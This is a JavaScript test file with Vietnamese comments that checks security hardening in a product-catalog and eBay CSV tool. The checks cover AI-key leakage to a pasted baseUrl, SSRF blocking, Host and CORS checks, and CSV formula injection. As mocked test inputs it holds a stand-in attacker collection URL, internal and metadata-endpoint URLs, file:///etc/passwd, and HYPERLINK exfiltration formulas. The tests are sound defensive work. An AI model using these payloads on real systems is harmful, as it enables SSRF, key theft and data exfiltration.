// tests/security-hardening.test.mjs — Các lỗ hổng/độ bền đã sửa (25/11/2026):
// - key AI trong env không bị gửi tới baseUrl dán trong web;
// - stripHtmlToText chạy tuyến tính với chuỗi nhiều '<' / '<script';
// - giãn cách gọi AI đúng cả khi 2 request đồng thời;
// - mirror ảnh R2 chặn URL nội bộ, SVG, redirect vào mạng nội bộ, ảnh quá lớn;
// - template thiếu categoryId không nuốt các nhóm chưa có mã;
// - giới hạn productIds kiểm tra trước vòng lặp;
// - dev server: %-encoding hỏng -> 400, Host lạ -> 403, CORS không còn '*'.
// Không gọi mạng thật: mock fetch; dev server chạy ở cổng ngẫu nhiên, file dữ liệu tạm.
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { spawn } from 'node:child_process';
import { randomUUID } from 'node:crypto';
import { readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { AiRuntime, stripHtmlToText } from '../server/ai-providers.mjs';
import { CloudflareImagesRuntime, isAllowedImageSourceUrl } from '../server/cloudflare-images.mjs';
import { MemoryStore, handleRequest, MAX_RECORDS_PER_REQUEST } from '../server/api.mjs';
import { parseEbayTemplate, normalizeRecord, groupProductsByTheme, buildGroupedEbayCsvs } from '../public/core.js';

const root = path.dirname(path.dirname(fileURLToPath(import.meta.url)));

// ---- AI: key env không đi theo baseUrl web ---------------------------------

test('AI: baseUrl dán trong web KHÔNG được dùng với key env (chống lộ AI_API_KEY)', async () => {
  const rt = new AiRuntime({ AI_API_KEY: 'sk-SECRET-ENV', AI_PROVIDER: 'openai', AI_MIN_INTERVAL_MS: '0' });
  const calls = [];
  rt.fetchFn = async (url, init) => {
    calls.push({ url: String(url), auth: init?.headers?.Authorization ?? init?.headers?.authorization });
    return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: '{}' } }] }) };
  };
  rt.setMemoryConfig({ baseUrl: 'https://attacker.example/collect' });
  assert.notEqual(rt.getEffectiveConfig().baseUrl, 'https://attacker.example/collect');
  await rt.callLlmJson('sys', 'user').catch(() => null);
  assert.ok(calls.length >= 1, 'đã gọi LLM');
  assert.ok(calls.every((c) => !c.url.includes('attacker.example')), `không gọi tới attacker: ${calls.map((c) => c.url).join(', ')}`);
});

test('AI: key dán trong web vẫn dùng được baseUrl web (OpenAI-compatible tuỳ chỉnh)', () => {
  const rt = new AiRuntime({});
  rt.setMemoryConfig({ apiKey: 'sk-web', baseUrl: 'https://llm.example/v1' });
  assert.equal(rt.getEffectiveConfig().baseUrl, 'https://llm.example/v1');
});

test('AI: baseUrl không phải http(s) bị từ chối với 400 invalid_base_url', async () => {
  const aiRuntime = new AiRuntime({});
  const res = await handleRequest(new MemoryStore(), { method: 'POST', path: '/api/ai/config', bodyText: JSON.stringify({ baseUrl: 'file:///etc/passwd' }) }, { aiRuntime });
  assert.equal(res.status, 400);
  assert.equal(res.json.error, 'invalid_base_url');
  assert.equal(aiRuntime.memory.baseUrl, null);
});

// ---- stripHtmlToText tuyến tính ---------------------------------------------

test('stripHtmlToText: chuỗi nhiều "<" và "<script" không chặn event loop', () => {
  const t0 = performance.now();
  stripHtmlToText('<'.repeat(6_000_000));
  stripHtmlToText('<script>'.repeat(500_000), 12_000);
  stripHtmlToText(`${'<a'.repeat(300_000)}>`, 12_000);
  const ms = performance.now() - t0;
  assert.ok(ms < 1500, `mất ${Math.round(ms)}ms (trước đây hàng phút/giờ)`);
});

test('stripHtmlToText: kết quả vẫn đúng như trước', () => {
  assert.equal(stripHtmlToText('<p>Hello <b>world</b></p><script>alert(1)</script><style>p{}</style>'), 'Hello world');
  assert.equal(stripHtmlToText('A<SCRIPT type="x">bad()</SCRIPT>B'), 'A B');
  assert.equal(stripHtmlToText('Kích thước <br/>40 &amp; 50cm'), 'Kích thước 40 & 50cm');
});

// ---- Giãn cách gọi AI đồng thời ---------------------------------------------

test('AI: 2 lượt gọi đồng thời vẫn cách nhau đủ khoảng giãn cách', async () => {
  const rt = new AiRuntime({ AI_MIN_INTERVAL_MS: '120' });
  const done = [];
  await Promise.all([rt.waitForRateLimit().then(() => done.push(Date.now())), rt.waitForRateLimit().then(() => done.push(Date.now()))]);
  done.sort((a, b) => a - b);
  assert.ok(done[1] - done[0] >= 100, `2 lượt cách nhau ${done[1] - done[0]}ms`);
});

// ---- Mirror ảnh R2 ----------------------------------------------------------

const R2_ENV = {
  CLOUDFLARE_R2_ACCOUNT_ID: 'test-acct', CLOUDFLARE_R2_ACCESS_KEY_ID: 'kid', CLOUDFLARE_R2_SECRET_ACCESS_KEY: 'secret',
  CLOUDFLARE_R2_BUCKET: 'b', CLOUDFLARE_R2_PUBLIC_URL: 'https://images.example.com',
};
function imgResponse({ status = 200, type = 'image/jpeg', length, location, body } = {}) {
  const bytes = body ?? new TextEncoder().encode('fake-image');
  return {
    ok: status >= 200 && status < 300, status,
    headers: { get: (n) => ({ 'content-type': type, 'content-length': length != null ? String(length) : String(bytes.length), location: location ?? null })[String(n).toLowerCase()] ?? null },
    arrayBuffer: async () => bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength),
  };
}

test('isAllowedImageSourceUrl: chỉ http(s) tới host công khai', () => {
  for (const ok of ['https://assets.sohohome.com/a.jpg', 'http://cdn.shop.example/x.png', 'https://8.8.8.8/i.jpg']) {
    assert.equal(isAllowedImageSourceUrl(ok), true, ok);
  }
  for (const bad of ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:8787/api/bootstrap', 'http://localhost/x.jpg',
    'http://10.0.0.5/a.jpg', 'http://192.168.1.2/a.jpg', 'http://172.20.0.1/a.jpg', 'http://[::1]/a.jpg', 'http://[::ffff:127.0.0.1]/a.jpg',
    'http://[fd00::1]/a.jpg', 'file:///etc/passwd', 'ftp://x.example/a.jpg', 'https://user:pw@x.example/a.jpg', 'javascript:alert(1)', '']) {
    assert.equal(isAllowedImageSourceUrl(bad), false, bad);
  }
});

test('R2: URL nội bộ bị từ chối mà không fetch', async () => {
  const calls = [];
  const rt = new CloudflareImagesRuntime(R2_ENV, async (url) => { calls.push(url); return imgResponse(); });
  await assert.rejects(rt.uploadImage('http://169.254.169.254/latest/meta-data/iam'), { code: 'invalid_url' });
  assert.equal(calls.length, 0);
});

test('R2: SVG / text/plain không được mirror (chống XSS + lộ dữ liệu)', async () => {
  for (const type of ['image/svg+xml', 'text/plain', 'application/json']) {
    const rt = new CloudflareImagesRuntime(R2_ENV, async () => imgResponse({ type }));
    await assert.rejects(rt.uploadImage('https://cdn.example/a.jpg'), { code: 'r2_download_failed' }, type);
  }
});

test('R2: redirect sang IP nội bộ bị chặn; redirect hợp lệ vẫn theo được', async () => {
  const bad = new CloudflareImagesRuntime(R2_ENV, async () => imgResponse({ status: 302, location: 'http://127.0.0.1/secret' }));
  await assert.rejects(bad.uploadImage('https://cdn.example/a.jpg'), { code: 'invalid_url' });

  const seen = [];
  const good = new CloudflareImagesRuntime(R2_ENV, async (url, init = {}) => {
    seen.push(String(url));
    if (String(init.method).toUpperCase() === 'PUT') return { ok: true, status: 200, text: async () => '' };
    if (String(url) === 'https://cdn.example/a.jpg') return imgResponse({ status: 301, location: '/real/b.jpg' });
    return imgResponse();
  });
  const out = await good.uploadImage('https://cdn.example/a.jpg');
  assert.match(out, /^https:\/\/images\.example\.com\/images\//);
  assert.ok(seen.includes('https://cdn.example/real/b.jpg'));
});

test('R2: content-length > 20MB bị từ chối trước khi đọc body; body stream quá lớn bị cắt', async () => {
  let read = false;
  const big = new CloudflareImagesRuntime(R2_ENV, async () => ({ ...imgResponse({ length: 50 * 1024 * 1024 }), arrayBuffer: async () => { read = true; return new ArrayBuffer(1); } }));
  await assert.rejects(big.uploadImage('https://cdn.example/a.jpg'), /quá lớn/);
  assert.equal(read, false, 'không đọc body khi content-length đã quá lớn');

  const chunk = new Uint8Array(4 * 1024 * 1024);
  let pulled = 0;
  const stream = new ReadableStream({ pull(controller) { pulled++; controller.enqueue(chunk); } });
  const streamRt = new CloudflareImagesRuntime(R2_ENV, async () => ({ ...imgResponse({ length: null }), headers: { get: (n) => (String(n).toLowerCase() === 'content-type' ? 'image/jpeg' : null) }, body: stream }));
  await assert.rejects(streamRt.uploadImage('https://cdn.example/b.jpg'), /quá lớn/);
  assert.ok(pulled <= 8, `dừng đọc sớm (đã kéo ${pulled} chunk 4MB)`);
});

// ---- core: template không có categoryId -------------------------------------

test('buildGroupedEbayCsvs: template thiếu categoryId không xuất nhóm chưa có mã dưới template đó', () => {
  const template = parseEbayTemplate(readFileSync(path.join(root, 'public', 'templates', 'ebay-20563.csv'), 'utf-8'));
  const noCatTemplate = { ...template, categoryId: null };
  const mk = (id, title) => normalizeRecord({ source_site: 'sohohome.com', source_url: `https://www.sohohome.com/us/products/${id}`, source_product_id: id,
    brand: 'Soho Home', title, images: ['https://assets.sohohome.com/x.jpg'], variants: [{ options: {}, price: 100, in_stock: true }] }).product;
  const products = [mk('archie-table-lamp', 'Archie Table Lamp'), mk('betty-mirror', 'Betty Wall Mirror')];
  const { files } = buildGroupedEbayCsvs(products, noCatTemplate, { markupPct: 0, ebayFeePct: 0, roundTo99: false }, groupProductsByTheme(products));
  assert.ok(files.every((f) => !String(f.filename).startsWith('ebay-null-')), `không có file ebay-null-*: ${files.map((f) => f.filename).join(', ')}`);
});

// ---- API: giới hạn productIds -----------------------------------------------

test('API: productIds vượt giới hạn bị từ chối trước khi đọc store', async () => {
  const store = new MemoryStore();
  let reads = 0;
  const orig = store.getProduct.bind(store);
  store.getProduct = (id) => { reads++; return orig(id); };
  const ids = Array.from({ length: MAX_RECORDS_PER_REQUEST + 1 }, (_, i) => `p${i}`);
  for (const route of ['/api/ai/group', '/api/ebay/enrich-all']) {
    const res = await handleRequest(store, { method: 'POST', path: route, bodyText: JSON.stringify({ productIds: ids }) });
    assert.equal(res.status, 400, route);
    assert.equal(res.json.error, 'too_many_products', route);
  }
  assert.equal(reads, 0);
});

// ---- Dev server thật (child process) ----------------------------------------

function freePort() {
  return new Promise((resolve, reject) => {
    const s = http.createServer();
    s.once('error', reject);
    s.listen(0, '127.0.0.1', () => { const { port } = s.address(); s.close(() => resolve(port)); });
  });
}
function rawGet(port, pathName, headers = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port, path: pathName, method: 'GET', headers }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on('error', reject);
    req.end();
  });
}

test('dev server: URL hỏng -> 400, Host lạ -> 403, CORS chỉ cho extension/localhost', { timeout: 20000 }, async () => {
  const port = await freePort();
  const dataFile = path.join(tmpdir(), `csv-studio-sec-${randomUUID()}.json`);
  const child = spawn(process.execPath, ['scripts/dev-server.mjs'], {
    cwd: root, env: { ...process.env, PORT: String(port), HOST: '', CSV_STUDIO_DATA_FILE: dataFile },
    stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true,
  });
  let stderr = '';
  child.stderr.on('data', (c) => { stderr += c; });
  try {
    await new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error('dev server không khởi động')), 10000);
      child.stdout.on('data', (c) => { if (String(c).includes('dev server:')) { clearTimeout(timer); resolve(); } });
      child.once('exit', (code) => { clearTimeout(timer); reject(new Error(`dev server thoát sớm (${code}): ${stderr}`)); });
    });
    const host = { Host: `localhost:${port}` };
    const bad = await rawGet(port, '/%E0%A4%A', host);
    assert.equal(bad.status, 400);
    assert.doesNotMatch(stderr, /URIError/);

    const rebinding = await rawGet(port, '/api/bootstrap', { Host: `evil.example:${port}` });
    assert.equal(rebinding.status, 403);

    const evil = await rawGet(port, '/api/products', { ...host, Origin: 'https://evil.example' });
    assert.equal(evil.status, 200);
    assert.equal(evil.headers['access-control-allow-origin'], undefined, 'website lạ không đọc được API qua CORS');

    const extOrigin = `chrome-extension://${'a'.repeat(32)}`;
    const ext = await rawGet(port, '/api/products', { ...host, Origin: extOrigin });
    assert.equal(ext.headers['access-control-allow-origin'], extOrigin);

    const home = await rawGet(port, '/', { Host: `127.0.0.1:${port}` });
    assert.equal(home.status, 200);
  } finally {
    child.kill();
    rmSync(dataFile, { force: true });
  }
});

// ---- CSV formula injection + 409 do object cũ (25/11/2026) -------------------

test('CSV research: ô dạng công thức bị vô hiệu hoá; số âm/dương giữ nguyên', async () => {
  const { buildResearchCsv, csvEscape, looksLikeCsvFormula, parseCsvText } = await import('../public/core.js');
  assert.equal(looksLikeCsvFormula('=HYPERLINK("http://evil","x")'), true);
  assert.equal(looksLikeCsvFormula('@SUM(1+1)'), true);
  assert.equal(looksLikeCsvFormula('-5'), false);
  assert.equal(looksLikeCsvFormula('+1.50'), false);
  assert.equal(looksLikeCsvFormula('Soho Home Lamp'), false);
  assert.equal(csvEscape('=1+1'), '=1+1', 'mặc định không đổi dữ liệu (file upload)');
  assert.equal(csvEscape('=1+1', { neutralizeFormulas: true }), "'=1+1");
  const csv = buildResearchCsv([{ id: 'x', title: '=HYPERLINK("http://evil/?x="&B2,"Click")', source_url: 'https://shop.example/x', ebayItemTitle: '@cmd' }]);
  const rows = parseCsvText(csv.replace(/^\uFEFF/, ''));
  const cells = rows.slice(1).flat();
  assert.ok(cells.every((c) => !looksLikeCsvFormula(c)), `không còn ô dạng công thức: ${JSON.stringify(cells)}`);
});

test('CSV upload: tiêu đề dạng công thức được báo trong validationIssues (không sửa ngầm)', () => {
  const template = parseEbayTemplate(readFileSync(path.join(root, 'public', 'templates', 'ebay-20563.csv'), 'utf-8'));
  const product = normalizeRecord({ source_site: 'sohohome.com', source_url: 'https://www.sohohome.com/us/products/evil', source_product_id: 'evil',
    brand: 'Soho Home', title: '=HYPERLINK("http://evil","Square Cushion")', images: ['https://assets.sohohome.com/x.jpg'],
    variants: [{ options: {}, price: 100, in_stock: true }] }).product;
  const groups = [{ key: 'cushions', label: 'Cushions', categoryId: template.categoryId, products: [product] }];
  const { files } = buildGroupedEbayCsvs([product], template, { markupPct: 0, ebayFeePct: 0, roundTo99: false }, groups);
  assert.equal(files.length, 1);
  assert.ok(files[0].validationIssues.some((i) => i.code === 'csv_formula_like' && i.field === 'Title'), JSON.stringify(files[0].validationIssues.map((i) => i.code)));
  assert.equal(files[0].needsReview, true);
});

test('web: cập nhật sản phẩm tại chỗ, không thay object (tránh 409 giả từ panel chi tiết)', () => {
  const js = readFileSync(path.join(root, 'public', 'app.js'), 'utf-8');
  assert.ok(!js.includes('state.products = state.products.map('), 'không còn thay object sản phẩm bằng object mới');
  assert.ok(js.includes('function updateProductInPlace('));
  assert.ok(js.includes('upsertProductState(saved)'));
  assert.ok(js.includes('replaceProductsState(products)'), 'loadBootstrap giữ nguyên object đang mở');
});
